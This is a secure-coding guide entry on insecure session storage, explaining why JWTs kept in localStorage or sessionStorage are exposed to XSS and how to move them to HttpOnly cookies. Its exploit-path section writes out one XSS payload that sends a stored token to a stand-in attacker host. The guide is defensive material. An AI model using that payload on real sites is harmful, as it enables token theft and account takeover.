# 25. Insecure Session Storage

## 🟠 Risk Level: **HIGH**

## 📋 Vulnerability Description

Vibe-coded frontend logic often stores sensitive session tokens (JWTs) or API secrets in `localStorage` or `sessionStorage`. These storage mechanisms are accessible to any JavaScript running on the page, making the tokens easy to steal via Cross-Site Scripting (XSS) attacks.

**Impact:**
- Token theft via XSS
- Session hijacking
- Account takeover
- Unauthorized access

## 🎯 Context: Why This Happens

Common patterns:
- localStorage for "persistence"
- sessionStorage for "session"
- No understanding of XSS risk
- Convenience over security

## 🔍 Detection Methods

### 1. Code Analysis

**Search for:**
```javascript
localStorage.setItem('token', token)
sessionStorage.setItem('auth', auth)
```

### 2. Browser Inspection

**DevTools → Application → Storage:**
- Check if tokens in localStorage
- Check if tokens in sessionStorage

## ✅ Verification Requirements

### Must Have:
1. **HttpOnly Cookies**
   - Tokens in HttpOnly cookies
   - Not accessible to JavaScript
   - Secure and SameSite flags

2. **No localStorage/sessionStorage**
   - No tokens in web storage
   - No sensitive data in storage

## 🚨 Exploit Path

### Scenario 1: XSS Token Theft
```
1. Attacker injects XSS: <script>fetch('evil.com?token='+localStorage.token)</script>
2. Script executes in victim's browser
3. Reads token from localStorage
4. Sends to attacker's server
5. Attacker uses token
6. Session hijacked
```

## 🔧 Remediation Steps

### Step 1: Use HttpOnly Cookies

**Backend:**
```javascript
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await authenticate(email, password);
  const token = generateToken(user);
  
  // Set HttpOnly cookie
  res.cookie('token', token, {
    httpOnly: true,  // ✅ Not accessible to JavaScript
    secure: true,   // ✅ HTTPS only
    sameSite: 'strict', // ✅ CSRF protection
    maxAge: 24 * 60 * 60 * 1000 // 24 hours
  });
  
  res.json({ success: true });
});
```

**Frontend:**
```javascript
// ❌ VULNERABLE: localStorage
localStorage.setItem('token', token);

// ✅ SECURE: Cookie (set by server)
// No JavaScript access needed
fetch('/api/protected', {
  credentials: 'include' // Sends cookie automatically
});
```

### Step 2: Clear Storage on Logout

```javascript
function logout() {
  // Clear any stored tokens
  localStorage.removeItem('token');
  sessionStorage.removeItem('token');
  
  // Call logout endpoint (clears cookie)
  fetch('/api/logout', {
    method: 'POST',
    credentials: 'include'
  });
}
```

## 📝 Code Examples

### ❌ Vulnerable

```javascript
// ❌ VULNERABLE: localStorage
const token = response.data.token;
localStorage.setItem('token', token);

// Later...
const token = localStorage.getItem('token');
fetch('/api/data', {
  headers: { 'Authorization': `Bearer ${token}` }
});
```

### ✅ Secure

```javascript
// ✅ SECURE: HttpOnly cookie
// Backend sets cookie
res.cookie('token', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});

// Frontend - no token storage needed
fetch('/api/data', {
  credentials: 'include' // Cookie sent automatically
});
```

## 🧪 Testing Checklist

- [ ] No tokens in localStorage
- [ ] No tokens in sessionStorage
- [ ] Tokens in HttpOnly cookies
- [ ] Secure flag set on cookies
- [ ] SameSite flag configured
- [ ] Cookies cleared on logout

## 📚 References

- [OWASP: HTML5 Security](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)
- [MDN: HttpOnly Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies)

## 🔗 Related Vulnerabilities

- [13. Missing CSRF Protection](../api_security/13_missing_csrf_protection.md)
- [39. Unsanitized DOM Injection](../input_validation/39_unsanitized_dom_injection.md)

---

**Classification**:
- **Confirmed** if tokens in localStorage/sessionStorage
- **Likely** if sensitive data in web storage
- **Not Applicable** if using HttpOnly cookies
